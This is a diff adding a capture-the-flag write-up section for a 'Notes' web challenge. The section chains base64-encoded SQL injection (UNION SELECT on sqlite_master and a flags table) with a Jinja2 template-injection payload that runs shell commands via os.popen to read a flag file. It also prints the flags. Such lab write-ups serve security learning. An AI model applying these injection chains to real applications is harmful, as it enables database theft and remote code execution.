@@ -79,7 +79,61 @@ moidfying JWT value will reveal the flag
 
 # 6- Notes | 100 pts
 
+```
+can't login or regiseter only can view notes tab and there find some notes and checked them
+```
+![image](https://user-images.githubusercontent.com/67979878/132009366-7b8b7624-2aac-435c-b8fa-63dc53c3238b.png)
 
+```
+when visit any page it take note name and base64 it 
+```
+![image](https://user-images.githubusercontent.com/67979878/132009583-954852a6-5e22-4fc0-8e64-37ecd479d81c.png)
 
+```
+it looks like if there is a hidden parameter at this tempelate and it takes this text and decode it then retrieve data 
+[x] let's try inject some XSS , failed
+[]  try some sql :D 
+
+junk' UNION SELECT * FROM information_schema.tables-- => base64 it
+```
+![image](https://user-images.githubusercontent.com/67979878/132010241-57f1572c-5f60-4934-bd66-c19ba4e4ad8e.png)
+```
+so it is not MySQL let's try sqlite :
+junk' UNION SELECT * FROM sqlite_master--
+```
+![image](https://user-images.githubusercontent.com/67979878/132010405-1d404520-60e3-4bad-b87b-4176e94ddd1c.png)
+```
+it looks like it is , but need to specify right number of columns 
+junk' UNION SELECT tbl_name FROM sqlite_master--
+
+```
+![image](https://user-images.githubusercontent.com/67979878/132010547-3b447f89-9943-4249-be68-1472ebd07032.png)
+
+``junk' UNION SELECT flag FROM flags--``
+
+![image](https://user-images.githubusercontent.com/67979878/132010692-e8da36ad-8530-407d-bd64-cfae3a7ec05b.png)
+
+we have half of the flag 
+`You made it! FLAG{8f94cf148a9f01a3745e`
+
+we have a note saying : `I like flask and this ginger thing`
+ginger ==> jinja
+![image](https://user-images.githubusercontent.com/67979878/132011021-9e1ae56e-26ac-485a-9663-04a7bc2608ea.png)
+
+check : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
+
+![image](https://user-images.githubusercontent.com/67979878/132011271-2fd73a73-5927-4a7f-93ee-dc7da7d2092e.png)
+
+we have a hint form the author : `The second part of the flag has to do with your reflected input. what input can you reflect on the page?`
+- we can only reflect our sql injection :3 so let's try inject SSTI inside SQLi 
+`junk' UNION SELECT "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+" FROM flags--`
+![image](https://user-images.githubusercontent.com/67979878/132011535-bc8ab651-6efd-496a-aa57-5a18c87db04b.png)
+`junk' UNION SELECT "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag2.txt').read() }}
+" FROM flags--`
+
+![image](https://user-images.githubusercontent.com/67979878/132012186-f691aa0f-281a-43a6-9733-4ced95d0b297.png)
+
+`FLAG{8f94cf148a9f01a3745e12f1fc6f8e419dc0fb08}`
 
 # 7- grocery bot | 200 pts
